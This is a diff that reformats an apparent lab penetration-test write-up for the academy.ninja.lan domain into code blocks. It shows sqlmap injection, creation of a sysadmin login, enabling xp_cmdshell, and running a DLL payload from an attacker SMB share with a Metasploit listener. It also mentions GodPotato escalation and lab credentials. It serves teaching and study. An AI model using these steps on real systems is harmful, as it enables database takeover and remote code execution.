@@ -927,8 +927,8 @@ tempdb</p>
 --columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
 -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column</code></pre>
 
-<p>Enumerating some information inside MSSQL like hostname, current user and it’s permission inside MSSQL.
-sqlmap -u 'http://web.academy.ninja.lan/Students?SearchString=charlie%2522&orderBy=Firstname' --batch --hostname --current-user --is-dba --threads=10</p>
+<p>Enumerating some information inside MSSQL like hostname, current user and it's permission inside MSSQL.</p>
+<pre><code>sqlmap -u 'http://web.academy.ninja.lan/Students?SearchString=charlie%2522&orderBy=Firstname' --batch --hostname --current-user --is-dba --threads=10</code></pre>
 
 <img src="./images/screenshot_14.png" alt="">
 
@@ -938,21 +938,21 @@ sqlmap -u 'http://web.academy.ninja.lan/Students?SearchString=charlie%2522&order
 
 <p>I spent some time enumerating the MSSQL, I was able to retrieve valid information like the current user running the MSSQL and its privileges. I found that user is ‘sa’ and as we know ‘sa’ is a DBA, in this case it’s Database Administrator, meaning, this is the highest privilege we have inside MSSQL and with this privilege we can do absolutely everything. So I started by creating our own user inside SQL server and also giving high privilege rights to our user as well so we can access it straightforward and avoid this slow queries we are making with SQLMap. We can use the flag - -sql-shell to get an interactive session with MSSQL server. </p>
 
-<p>sqlmap -u 'http://web.academy.ninja.lan/Students?SearchString=charlie%2522&orderBy=Firstname' --batch --hostname --current-user --is-dba --threads=10 --sql-shell</p>
+<pre><code>sqlmap -u 'http://web.academy.ninja.lan/Students?SearchString=charlie%2522&orderBy=Firstname' --batch --hostname --current-user --is-dba --threads=10 --sql-shell</code></pre>
 
-<p>CREATE LOGIN stark WITH PASSWORD = 'Stark123!'</p>
+<pre><code>CREATE LOGIN stark WITH PASSWORD = 'Stark123!'</code></pre>
 
-<p>EXEC sp_addsrvrolemember 'stark', 'sysadmin'</p>
+<pre><code>EXEC sp_addsrvrolemember 'stark', 'sysadmin'</code></pre>
 
 <img src="./images/screenshot_15.png" alt="">
 
-<p>Then I tried to login with the new created account stark into sql.academy.ninja.lan and it worked.
-mssqlclient.py 'academy.ninja.lan/stark:Stark123!@sql.academy.ninja.lan'</p>
+<p>Then I tried to login with the new created account stark into sql.academy.ninja.lan and it worked.</p>
+<pre><code>mssqlclient.py 'academy.ninja.lan/stark:Stark123!@sql.academy.ninja.lan'</code></pre>
 
 <img src="./images/screenshot_16.png" alt="">
 
-<p>Users enumeration can be achieved using the following command.
-enum_logins</p>
+<p>Users enumeration can be achieved using the following command.</p>
+<pre><code>enum_logins</code></pre>
 
 <img src="./images/screenshot_17.png" alt="">
 
@@ -960,8 +960,8 @@ enum_logins</p>
 
 <h2 id="impersonate---execute-as-login">Impersonate - execute as login</h2>
 
-<p>We can enumerate the users we can impersonate on the server.  Let’s see if we can enumerate some valid impersonation here. 
-enum_impersonate</p>
+<p>We can enumerate the users we can impersonate on the server. Let's see if we can enumerate some valid impersonation here.</p>
+<pre><code>enum_impersonate</code></pre>
 
 <img src="./images/screenshot_18.png" alt="">
 
@@ -992,11 +992,11 @@ JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id W
 
 <p>We could try to leverage this by running commands using the EXECUTE AS statement to impersonate the MS_DataCollectorInternalUser but instead, we already know that our created user contains enough privileges, so I’ll just impersonate sa user and carry on.</p>
 
-<p>exec_as_login sa</p>
+<pre><code>exec_as_login sa</code></pre>
 
-<p>enable_xp_cmdshell</p>
+<pre><code>enable_xp_cmdshell</code></pre>
 
-<p>xp_cmdshell whoami</p>
+<pre><code>xp_cmdshell whoami</code></pre>
 
 <img src="./images/screenshot_20.png" alt="">
 
@@ -1062,9 +1062,9 @@ python3 -m http.server 8080</p>
 <p>Listening on our attacking machine with msfconsole multi/handler.
 use exploit/multi/handler</p>
 
-<p>set LHOST 192.168.58.1</p>
+<pre><code>set LHOST 192.168.58.1</code></pre>
 
-<p>set LPORT 443</p>
+<pre><code>set LPORT 443</code></pre>
 
 <p>exploit</p>
 
@@ -1078,7 +1078,7 @@ I’m using xp_cmdshell to run my payload remotely on the target system in this 
 
 <p> Finally, I run my payload (fibers_loader.dll).</p>
 
-<p>xp_cmdshell "net use \\192.168.58.1\share /user:stark Stark123! && rundll32 \\192.168.58.1\share\fibers_loader.dll,inject"</p>
+<pre><code>xp_cmdshell "net use \\192.168.58.1\share /user:stark Stark123! && rundll32 \\192.168.58.1\share\fibers_loader.dll,inject"</code></pre>
 
 <img src="./images/screenshot_24.png" alt="">
 
@@ -1104,7 +1104,7 @@ whoami /all</p>
 
 <h4>Overview of GodPotato</h4>
 
-<p>GodPotato is a tool that leverages COM services to exploit the SeImpersonatePrivilege and achieve privilege escalation to SYSTEM. It is similar to other tools in the Potato family (like JuicyPotato and RottenPotato), but it works on newer versions of Windows where older Potato techniques might be mitigated.</p>
+<pre><code>GodPotato is a tool that leverages COM services to exploit the SeImpersonatePrivilege and achieve privilege escalation to SYSTEM. It is similar to other tools in the Potato family (like JuicyPotato and RottenPotato), but it works on newer versions of Windows where older Potato techniques might be mitigated.</code></pre>
 
 <h4>How GodPotato Works</h4>
 
@@ -1353,7 +1353,7 @@ SAPWD="sa_P@ssw0rd!N1nJ4hackaDemy"
 SQLSYSADMINACCOUNTS="NT AUTHORITY\NETWORK SERVICE"
 ADDCURRENTUSERASSQLADMIN="True"</code></pre>
 
-<p>mssqlclient.py 'academy.ninja.lan/sa':'sa_P@ssw0rd!N1nJ4hackaDemy'@'sql.academy.ninja.lan'</p>
+<pre><code>mssqlclient.py 'academy.ninja.lan/sa':'sa_P@ssw0rd!N1nJ4hackaDemy'@'sql.academy.ninja.lan'</code></pre>
 
 <img src="./images/screenshot_34.png" alt="">
 
@@ -1589,7 +1589,7 @@ export KRB5CCNAME=Administrator@cifs_web.academy.ninja.lan@ACADEMY.NINJA.LAN.cca
 
 <img src="./images/screenshot_44.png" alt="">
 
-<p>whoami /all</p>
+<pre><code>whoami /all</code></pre>
 
 <img src="./images/screenshot_45.png" alt="">
 
